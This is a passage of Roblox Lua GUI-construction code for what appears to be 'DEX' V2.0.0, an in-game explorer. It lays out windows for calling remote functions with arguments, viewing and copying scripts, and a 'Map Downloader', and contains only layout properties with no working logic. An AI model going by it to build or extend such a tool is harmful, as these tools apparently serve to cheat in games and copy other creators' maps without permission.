NewGuiPart62.FontSize = Enum.FontSize.Size14
NewGuiPart62.Text = "Arguments"
NewGuiPart62.TextWrapped = true

NewGuiPart63.Name = "Arguments"
NewGuiPart63.Parent = NewGuiPart61
NewGuiPart63.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart63.BackgroundTransparency = 1
NewGuiPart63.Position = UDim2.new(0, 0, 0, 40)
NewGuiPart63.Size = UDim2.new(1, 0, 0, 80)
NewGuiPart63.BottomImage = "rbxasset://textures/blackBkg_square.png"
NewGuiPart63.CanvasSize = UDim2.new(0, 0, 0, 0)
NewGuiPart63.MidImage = "rbxasset://textures/blackBkg_square.png"
NewGuiPart63.TopImage = "rbxasset://textures/blackBkg_square.png"

NewGuiPart64.Name = "DisplayReturned"
NewGuiPart64.Parent = NewGuiPart61
NewGuiPart64.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart64.BackgroundTransparency = 0.60000002384186
NewGuiPart64.Position = UDim2.new(0.075000003, 0, 0.625, 0)
NewGuiPart64.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart64.ZIndex = 2
NewGuiPart64.Font = Enum.Font.SourceSans
NewGuiPart64.FontSize = Enum.FontSize.Size18
NewGuiPart64.Text = ""
NewGuiPart64.TextColor3 = Color3.new(1, 1, 1)

NewGuiPart65.Name = "enabled"
NewGuiPart65.Parent = NewGuiPart64
NewGuiPart65.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
NewGuiPart65.BackgroundTransparency = 0.40000000596046
NewGuiPart65.BorderSizePixel = 0
NewGuiPart65.Position = UDim2.new(0, 3, 0, 3)
NewGuiPart65.Size = UDim2.new(0, 14, 0, 14)
NewGuiPart65.Visible = false
NewGuiPart65.Font = Enum.Font.SourceSans
NewGuiPart65.FontSize = Enum.FontSize.Size14
NewGuiPart65.Text = ""

NewGuiPart66.Name = "Desc2"
NewGuiPart66.Parent = NewGuiPart61
NewGuiPart66.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart66.BackgroundTransparency = 1
NewGuiPart66.Position = UDim2.new(0.075000003, 30, 0.625, 0)
NewGuiPart66.Size = UDim2.new(0.925000012, -30, 0, 20)
NewGuiPart66.Font = Enum.Font.SourceSans
NewGuiPart66.FontSize = Enum.FontSize.Size14
NewGuiPart66.Text = "Display values returned"
NewGuiPart66.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart67.Name = "Add"
NewGuiPart67.Parent = NewGuiPart61
NewGuiPart67.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart67.BackgroundTransparency = 0.5
NewGuiPart67.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart67.Position = UDim2.new(0.800000012, 0, 0.625, 0)
NewGuiPart67.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart67.Font = Enum.Font.SourceSansBold
NewGuiPart67.FontSize = Enum.FontSize.Size24
NewGuiPart67.Text = "+"

NewGuiPart68.Name = "Subtract"
NewGuiPart68.Parent = NewGuiPart61
NewGuiPart68.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart68.BackgroundTransparency = 0.5
NewGuiPart68.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart68.Position = UDim2.new(0.899999976, 0, 0.625, 0)
NewGuiPart68.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart68.Font = Enum.Font.SourceSansBold
NewGuiPart68.FontSize = Enum.FontSize.Size24
NewGuiPart68.Text = "-"

NewGuiPart69.Name = "ArgumentTemplate"
NewGuiPart69.Parent = NewGuiPart61
NewGuiPart69.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart69.BackgroundTransparency = 0.5
NewGuiPart69.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart69.Size = UDim2.new(1, 0, 0, 20)
NewGuiPart69.Visible = false

NewGuiPart70.Name = "Type"
NewGuiPart70.Parent = NewGuiPart69
NewGuiPart70.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart70.BackgroundTransparency = 0.89999997615814
NewGuiPart70.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart70.Size = UDim2.new(0.400000006, 0, 0, 20)
NewGuiPart70.Font = Enum.Font.SourceSans
NewGuiPart70.FontSize = Enum.FontSize.Size18
NewGuiPart70.Text = "Script"

NewGuiPart71.Name = "Value"
NewGuiPart71.Parent = NewGuiPart69
NewGuiPart71.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart71.BackgroundTransparency = 0.89999997615814
NewGuiPart71.Position = UDim2.new(0.400000006, 0, 0, 0)
NewGuiPart71.Size = UDim2.new(0.600000024, -12, 0, 20)
NewGuiPart71.Font = Enum.Font.SourceSans
NewGuiPart71.FontSize = Enum.FontSize.Size14
NewGuiPart71.Text = ""
NewGuiPart71.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart72.Name = "Cancel"
NewGuiPart72.Parent = NewGuiPart61
NewGuiPart72.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart72.BackgroundTransparency = 0.5
NewGuiPart72.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart72.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart72.Font = Enum.Font.SourceSans
NewGuiPart72.FontSize = Enum.FontSize.Size18
NewGuiPart72.Text = "Cancel"

NewGuiPart73.Name = "Ok"
NewGuiPart73.Parent = NewGuiPart61
NewGuiPart73.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart73.BackgroundTransparency = 0.5
NewGuiPart73.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart73.Position = UDim2.new(0.075000003, 0, 1, -40)
NewGuiPart73.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart73.Font = Enum.Font.SourceSans
NewGuiPart73.FontSize = Enum.FontSize.Size18
NewGuiPart73.Text = "Call"

NewGuiPart74.Name = "TableCaution"
NewGuiPart74.Parent = NewGuiPart1
NewGuiPart74.Active = true
NewGuiPart74.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart74.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart74.Draggable = true
NewGuiPart74.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart74.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart74.Visible = false
NewGuiPart74.ZIndex = 2

NewGuiPart75.Name = "MainWindow"
NewGuiPart75.Parent = NewGuiPart74
NewGuiPart75.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart75.BackgroundTransparency = 0.10000000149012
NewGuiPart75.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart75.Size = UDim2.new(1, 0, 0, 150)

NewGuiPart76.Name = "Ok"
NewGuiPart76.Parent = NewGuiPart75
NewGuiPart76.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart76.BackgroundTransparency = 0.5
NewGuiPart76.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart76.Position = UDim2.new(0.300000012, 0, 1, -40)
NewGuiPart76.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart76.Font = Enum.Font.SourceSans
NewGuiPart76.FontSize = Enum.FontSize.Size18
NewGuiPart76.Text = "Ok"

NewGuiPart77.Name = "TableResults"
NewGuiPart77.Parent = NewGuiPart75
NewGuiPart77.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart77.BackgroundTransparency = 1
NewGuiPart77.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart77.Size = UDim2.new(1, 0, 0, 80)
NewGuiPart77.BottomImage = "rbxasset://textures/blackBkg_square.png"
NewGuiPart77.CanvasSize = UDim2.new(0, 0, 0, 0)
NewGuiPart77.MidImage = "rbxasset://textures/blackBkg_square.png"
NewGuiPart77.TopImage = "rbxasset://textures/blackBkg_square.png"

NewGuiPart78.Name = "TableTemplate"
NewGuiPart78.Parent = NewGuiPart75
NewGuiPart78.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart78.BackgroundTransparency = 0.5
NewGuiPart78.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart78.Size = UDim2.new(1, 0, 0, 20)
NewGuiPart78.Visible = false

NewGuiPart79.Name = "Type"
NewGuiPart79.Parent = NewGuiPart78
NewGuiPart79.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart79.BackgroundTransparency = 0.89999997615814
NewGuiPart79.Size = UDim2.new(0.400000006, 0, 0, 20)
NewGuiPart79.Font = Enum.Font.SourceSans
NewGuiPart79.FontSize = Enum.FontSize.Size18
NewGuiPart79.Text = "Script"

NewGuiPart80.Name = "Value"
NewGuiPart80.Parent = NewGuiPart78
NewGuiPart80.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart80.BackgroundTransparency = 0.89999997615814
NewGuiPart80.Position = UDim2.new(0.400000006, 0, 0, 0)
NewGuiPart80.Size = UDim2.new(0.600000024, -12, 0, 20)
NewGuiPart80.Font = Enum.Font.SourceSans
NewGuiPart80.FontSize = Enum.FontSize.Size14
NewGuiPart80.Text = "Script"

NewGuiPart81.Name = "Title"
NewGuiPart81.Parent = NewGuiPart74
NewGuiPart81.BackgroundTransparency = 1
NewGuiPart81.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart81.ZIndex = 2
NewGuiPart81.Font = Enum.Font.SourceSans
NewGuiPart81.FontSize = Enum.FontSize.Size14
NewGuiPart81.Text = "Caution"
NewGuiPart81.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart81.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart82.Name = "ScriptEditor"
NewGuiPart82.Parent = NewGuiPart1
NewGuiPart82.Active = true
NewGuiPart82.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart82.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart82.Draggable = true
NewGuiPart82.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart82.Size = UDim2.new(0, 516, 0, 20)
NewGuiPart82.Visible = false
NewGuiPart82.ZIndex = 5

NewGuiPart163.Name = "OpenScript"
NewGuiPart163.Parent = NewGuiPart82
NewGuiPart163.Archivable = true

NewGuiPart83.Name = "Title"
NewGuiPart83.Parent = NewGuiPart82
NewGuiPart83.BackgroundTransparency = 1
NewGuiPart83.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart83.ZIndex = 5
NewGuiPart83.Font = Enum.Font.SourceSans
NewGuiPart83.FontSize = Enum.FontSize.Size14
NewGuiPart83.Text = "Script Viewer"
NewGuiPart83.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart83.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart84.Name = "Cover"
NewGuiPart84.Parent = NewGuiPart82
NewGuiPart84.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart84.BorderSizePixel = 0
NewGuiPart84.Position = UDim2.new(0, 0, 3, 0)
NewGuiPart84.Size = UDim2.new(0, 516, 0, 416)

NewGuiPart85.Name = "EditorGrid"
NewGuiPart85.Parent = NewGuiPart82
NewGuiPart85.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart85.BorderSizePixel = 0
NewGuiPart85.Position = UDim2.new(0, 0, 3, 0)
NewGuiPart85.Size = UDim2.new(0, 500, 0, 400)

NewGuiPart86.Name = "TopBar"
NewGuiPart86.Parent = NewGuiPart82
NewGuiPart86.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
NewGuiPart86.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart86.Size = UDim2.new(1, 0, 3, 0)

NewGuiPart87.Name = "ScriptBarLeft"
NewGuiPart87.Parent = NewGuiPart86
NewGuiPart87.Active = false
NewGuiPart87.BackgroundColor3 = Color3.new(0.866667, 0.866667, 0.866667)
NewGuiPart87.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart87.Position = UDim2.new(1, -32, 0, 40)
NewGuiPart87.Size = UDim2.new(0, 16, 0, 20)
NewGuiPart87.AutoButtonColor = false

NewGuiPart88.Name = "Arrow Graphic"
NewGuiPart88.Parent = NewGuiPart87
NewGuiPart88.BackgroundTransparency = 1
NewGuiPart88.BorderSizePixel = 0
NewGuiPart88.Position = UDim2.new(0.5, -4, 0.5, -4)
NewGuiPart88.Size = UDim2.new(0, 8, 0, 8)

NewGuiPart89.Name = "Graphic"
NewGuiPart89.Parent = NewGuiPart88
NewGuiPart89.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart89.BackgroundTransparency = 0.69999998807907
NewGuiPart89.BorderSizePixel = 0
NewGuiPart89.Position = UDim2.new(0.25, 0, 0.375, 0)
NewGuiPart89.Size = UDim2.new(0.125, 0, 0.25, 0)

NewGuiPart90.Name = "Graphic"
NewGuiPart90.Parent = NewGuiPart88
NewGuiPart90.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart90.BackgroundTransparency = 0.69999998807907
NewGuiPart90.BorderSizePixel = 0
NewGuiPart90.Position = UDim2.new(0.375, 0, 0.25, 0)
NewGuiPart90.Size = UDim2.new(0.125, 0, 0.5, 0)

NewGuiPart91.Name = "Graphic"
NewGuiPart91.Parent = NewGuiPart88
NewGuiPart91.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart91.BackgroundTransparency = 0.69999998807907
NewGuiPart91.BorderSizePixel = 0
NewGuiPart91.Position = UDim2.new(0.5, 0, 0.125, 0)
NewGuiPart91.Size = UDim2.new(0.125, 0, 0.75, 0)

NewGuiPart92.Name = "Graphic"
NewGuiPart92.Parent = NewGuiPart88
NewGuiPart92.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart92.BackgroundTransparency = 0.69999998807907
NewGuiPart92.BorderSizePixel = 0
NewGuiPart92.Position = UDim2.new(0.625, 0, 0, 0)
NewGuiPart92.Size = UDim2.new(0.125, 0, 1, 0)

NewGuiPart93.Name = "ScriptBarRight"
NewGuiPart93.Parent = NewGuiPart86
NewGuiPart93.Active = false
NewGuiPart93.BackgroundColor3 = Color3.new(0.866667, 0.866667, 0.866667)
NewGuiPart93.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart93.Position = UDim2.new(1, -16, 0, 40)
NewGuiPart93.Size = UDim2.new(0, 16, 0, 20)
NewGuiPart93.AutoButtonColor = false

NewGuiPart94.Name = "Arrow Graphic"
NewGuiPart94.Parent = NewGuiPart93
NewGuiPart94.BackgroundTransparency = 1
NewGuiPart94.BorderSizePixel = 0
NewGuiPart94.Position = UDim2.new(0.5, -4, 0.5, -4)
NewGuiPart94.Size = UDim2.new(0, 8, 0, 8)

NewGuiPart95.Name = "Graphic"
NewGuiPart95.Parent = NewGuiPart94
NewGuiPart95.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart95.BackgroundTransparency = 0.69999998807907
NewGuiPart95.BorderSizePixel = 0
NewGuiPart95.Position = UDim2.new(0.625, 0, 0.375, 0)
NewGuiPart95.Size = UDim2.new(0.125, 0, 0.25, 0)

NewGuiPart96.Name = "Graphic"
NewGuiPart96.Parent = NewGuiPart94
NewGuiPart96.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart96.BackgroundTransparency = 0.69999998807907
NewGuiPart96.BorderSizePixel = 0
NewGuiPart96.Position = UDim2.new(0.5, 0, 0.25, 0)
NewGuiPart96.Size = UDim2.new(0.125, 0, 0.5, 0)

NewGuiPart97.Name = "Graphic"
NewGuiPart97.Parent = NewGuiPart94
NewGuiPart97.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart97.BackgroundTransparency = 0.69999998807907
NewGuiPart97.BorderSizePixel = 0
NewGuiPart97.Position = UDim2.new(0.375, 0, 0.125, 0)
NewGuiPart97.Size = UDim2.new(0.125, 0, 0.75, 0)

NewGuiPart98.Name = "Graphic"
NewGuiPart98.Parent = NewGuiPart94
NewGuiPart98.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart98.BackgroundTransparency = 0.69999998807907
NewGuiPart98.BorderSizePixel = 0
NewGuiPart98.Position = UDim2.new(0.25, 0, 0, 0)
NewGuiPart98.Size = UDim2.new(0.125, 0, 1, 0)

NewGuiPart99.Name = "Clipboard"
NewGuiPart99.Parent = NewGuiPart86
NewGuiPart99.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart99.BackgroundTransparency = 0.5
NewGuiPart99.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart99.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart99.Size = UDim2.new(0, 80, 0, 20)
NewGuiPart99.Font = Enum.Font.SourceSans
NewGuiPart99.FontSize = Enum.FontSize.Size14
NewGuiPart99.Text = "To Clipboard"

NewGuiPart100.Name = "ScriptBar"
NewGuiPart100.Parent = NewGuiPart86
NewGuiPart100.BackgroundColor3 = Color3.new(0.823529, 0.823529, 0.823529)
NewGuiPart100.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart100.ClipsDescendants = true
NewGuiPart100.Position = UDim2.new(0, 0, 0, 40)
NewGuiPart100.Size = UDim2.new(1, -32, 0, 20)

NewGuiPart101.Name = "Entry"
NewGuiPart101.Parent = NewGuiPart86
NewGuiPart101.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart101.BackgroundTransparency = 1
NewGuiPart101.Size = UDim2.new(0, 100, 1, 0)
NewGuiPart101.Visible = false

NewGuiPart102.Name = "Button"
NewGuiPart102.Parent = NewGuiPart101
NewGuiPart102.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart102.BackgroundTransparency = 0.60000002384186
NewGuiPart102.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart102.ClipsDescendants = true
NewGuiPart102.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart102.ZIndex = 4
NewGuiPart102.Font = Enum.Font.SourceSans
NewGuiPart102.FontSize = Enum.FontSize.Size12
NewGuiPart102.Text = ""
NewGuiPart102.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart103.Name = "Close"
NewGuiPart103.Parent = NewGuiPart101
NewGuiPart103.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart103.BackgroundTransparency = 1
NewGuiPart103.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart103.Position = UDim2.new(1, -20, 0, 0)
NewGuiPart103.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart103.ZIndex = 4
NewGuiPart103.Font = Enum.Font.SourceSans
NewGuiPart103.FontSize = Enum.FontSize.Size14
NewGuiPart103.Text = "X"

NewGuiPart104.Name = "Close"
NewGuiPart104.Parent = NewGuiPart82
NewGuiPart104.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart104.BackgroundTransparency = 1
NewGuiPart104.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart104.Position = UDim2.new(1, -20, 0, 0)
NewGuiPart104.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart104.ZIndex = 5
NewGuiPart104.Font = Enum.Font.SourceSans
NewGuiPart104.FontSize = Enum.FontSize.Size14
NewGuiPart104.Text = "X"

NewGuiPart105.Name = "IntroFrame"
NewGuiPart105.Parent = NewGuiPart1
NewGuiPart105.BackgroundColor3 = Color3.new(0.960784, 0.960784, 0.960784)
NewGuiPart105.BorderSizePixel = 0
NewGuiPart105.Position = UDim2.new(1, 30, 0, 0)
NewGuiPart105.Size = UDim2.new(0, 300, 1, 0)
NewGuiPart105.ZIndex = 2

NewGuiPart106.Name = "Main"
NewGuiPart106.Parent = NewGuiPart105
NewGuiPart106.BackgroundColor3 = Color3.new(0.960784, 0.960784, 0.960784)
NewGuiPart106.BorderSizePixel = 0
NewGuiPart106.Position = UDim2.new(0, -30, 0, 0)
NewGuiPart106.Size = UDim2.new(0, 30, 0, 90)
NewGuiPart106.ZIndex = 2

NewGuiPart107.Name = "Title"
NewGuiPart107.Parent = NewGuiPart105
NewGuiPart107.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart107.BackgroundTransparency = 1
NewGuiPart107.Position = UDim2.new(0, 100, 0, 150)
NewGuiPart107.Size = UDim2.new(0, 100, 0, 60)
NewGuiPart107.ZIndex = 2
NewGuiPart107.Font = Enum.Font.SourceSansBold
NewGuiPart107.FontSize = Enum.FontSize.Size60
NewGuiPart107.Text = "DEX"
NewGuiPart107.TextWrapped = true

NewGuiPart108.Name = "Version"
NewGuiPart108.Parent = NewGuiPart105
NewGuiPart108.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart108.BackgroundTransparency = 1
NewGuiPart108.Position = UDim2.new(0, 100, 0, 210)
NewGuiPart108.Size = UDim2.new(0, 100, 0, 30)
NewGuiPart108.ZIndex = 2
NewGuiPart108.Font = Enum.Font.SourceSansBold
NewGuiPart108.FontSize = Enum.FontSize.Size28
NewGuiPart108.Text = "V2.0.0"
NewGuiPart108.TextWrapped = true

NewGuiPart109.Name = "Creator"
NewGuiPart109.Parent = NewGuiPart105
NewGuiPart109.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart109.BackgroundTransparency = 1
NewGuiPart109.Position = UDim2.new(0, 80, 0, 300)
NewGuiPart109.Size = UDim2.new(0, 140, 0, 30)
NewGuiPart109.ZIndex = 2
NewGuiPart109.Font = Enum.Font.SourceSansBold
NewGuiPart109.FontSize = Enum.FontSize.Size28
NewGuiPart109.Text = "Raspberry Pi , Script Made By Advancedev"
NewGuiPart109.TextWrapped = true

NewGuiPart110.Name = "Slant"
NewGuiPart110.Parent = NewGuiPart105
NewGuiPart110.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart110.BackgroundTransparency = 1
NewGuiPart110.Position = UDim2.new(0, -30, 0, 90)
NewGuiPart110.Rotation = 180
NewGuiPart110.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart110.ZIndex = 2
NewGuiPart110.Image = "rbxassetid://474172996"
NewGuiPart110.ImageColor3 = Color3.new(0.960784, 0.960784, 0.960784)

NewGuiPart111.Name = "SaveMapWindow"
NewGuiPart111.Parent = NewGuiPart1
NewGuiPart111.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart111.BackgroundTransparency = 0.10000000149012
NewGuiPart111.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart111.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart111.Size = UDim2.new(0, 300, 1, 0)

NewGuiPart112.Name = "Header"
NewGuiPart112.Parent = NewGuiPart111
NewGuiPart112.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart112.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart112.Size = UDim2.new(1, 0, 0, 17)

NewGuiPart113.Parent = NewGuiPart112
NewGuiPart113.BackgroundTransparency = 1
NewGuiPart113.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart113.Size = UDim2.new(1, -4, 1, 0)
NewGuiPart113.Font = Enum.Font.SourceSans
NewGuiPart113.FontSize = Enum.FontSize.Size14
NewGuiPart113.Text = "Map Downloader"
NewGuiPart113.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart113.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart114.Name = "MapSettings"
NewGuiPart114.Parent = NewGuiPart111
NewGuiPart114.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart114.BackgroundTransparency = 1
NewGuiPart114.Position = UDim2.new(0, 0, 0, 200)
NewGuiPart114.Size = UDim2.new(1, 0, 0, 240)

NewGuiPart115.Name = "Terrain"
NewGuiPart115.Parent = NewGuiPart114
NewGuiPart115.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart115.BackgroundTransparency = 1
NewGuiPart115.Position = UDim2.new(0, 0, 0, 60)
NewGuiPart115.Size = UDim2.new(1, 0, 0, 60)

NewGuiPart116.Name = "SName"
NewGuiPart116.Parent = NewGuiPart115
NewGuiPart116.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart116.BackgroundTransparency = 1
NewGuiPart116.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart116.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart116.Font = Enum.Font.SourceSans
NewGuiPart116.FontSize = Enum.FontSize.Size18
NewGuiPart116.Text = "Save Terrain"
NewGuiPart116.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart117.Name = "Status"
NewGuiPart117.Parent = NewGuiPart115
NewGuiPart117.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart117.BackgroundTransparency = 1
NewGuiPart117.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart117.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart117.Font = Enum.Font.SourceSans
NewGuiPart117.FontSize = Enum.FontSize.Size18
NewGuiPart117.Text = "Off"
NewGuiPart117.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart118.Name = "Change"
NewGuiPart118.Parent = NewGuiPart115
NewGuiPart118.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart118.BorderSizePixel = 0
NewGuiPart118.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart118.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart118.Font = Enum.Font.SourceSans
NewGuiPart118.FontSize = Enum.FontSize.Size14
NewGuiPart118.Text = ""

NewGuiPart119.Name = "OnBar"
NewGuiPart119.Parent = NewGuiPart118
NewGuiPart119.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart119.BorderSizePixel = 0
NewGuiPart119.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart119.Font = Enum.Font.SourceSans
NewGuiPart119.FontSize = Enum.FontSize.Size14
NewGuiPart119.Text = ""

NewGuiPart120.Name = "Bar"
NewGuiPart120.Parent = NewGuiPart118
NewGuiPart120.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart120.BorderSizePixel = 0
NewGuiPart120.ClipsDescendants = true
NewGuiPart120.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart120.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart120.Font = Enum.Font.SourceSans
NewGuiPart120.FontSize = Enum.FontSize.Size14
NewGuiPart120.Text = ""

NewGuiPart121.Name = "Lighting"
NewGuiPart121.Parent = NewGuiPart114
NewGuiPart121.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart121.BackgroundTransparency = 1
NewGuiPart121.Position = UDim2.new(0, 0, 0, 120)
NewGuiPart121.Size = UDim2.new(1, 0, 0, 60)

NewGuiPart122.Name = "SName"
NewGuiPart122.Parent = NewGuiPart121
NewGuiPart122.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart122.BackgroundTransparency = 1
NewGuiPart122.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart122.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart122.Font = Enum.Font.SourceSans
NewGuiPart122.FontSize = Enum.FontSize.Size18
NewGuiPart122.Text = "Lighting Properties"
NewGuiPart122.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart123.Name = "Status"
NewGuiPart123.Parent = NewGuiPart121
NewGuiPart123.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart123.BackgroundTransparency = 1
NewGuiPart123.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart123.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart123.Font = Enum.Font.SourceSans
NewGuiPart123.FontSize = Enum.FontSize.Size18
NewGuiPart123.Text = "Off"
NewGuiPart123.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart124.Name = "Change"
NewGuiPart124.Parent = NewGuiPart121
NewGuiPart124.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart124.BorderSizePixel = 0
NewGuiPart124.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart124.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart124.Font = Enum.Font.SourceSans
NewGuiPart124.FontSize = Enum.FontSize.Size14
NewGuiPart124.Text = ""

NewGuiPart125.Name = "OnBar"
NewGuiPart125.Parent = NewGuiPart124
NewGuiPart125.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart125.BorderSizePixel = 0
NewGuiPart125.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart125.Font = Enum.Font.SourceSans
NewGuiPart125.FontSize = Enum.FontSize.Size14
NewGuiPart125.Text = ""

NewGuiPart126.Name = "Bar"
NewGuiPart126.Parent = NewGuiPart124
NewGuiPart126.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart126.BorderSizePixel = 0
NewGuiPart126.ClipsDescendants = true
NewGuiPart126.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart126.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart126.Font = Enum.Font.SourceSans
NewGuiPart126.FontSize = Enum.FontSize.Size14
NewGuiPart126.Text = ""

NewGuiPart127.Name = "CameraInstances"
NewGuiPart127.Parent = NewGuiPart114
NewGuiPart127.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart127.BackgroundTransparency = 1
NewGuiPart127.Position = UDim2.new(0, 0, 0, 180)
NewGuiPart127.Size = UDim2.new(1, 0, 0, 60)

NewGuiPart128.Name = "SName"
NewGuiPart128.Parent = NewGuiPart127
NewGuiPart128.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart128.BackgroundTransparency = 1
NewGuiPart128.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart128.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart128.Font = Enum.Font.SourceSans
NewGuiPart128.FontSize = Enum.FontSize.Size18
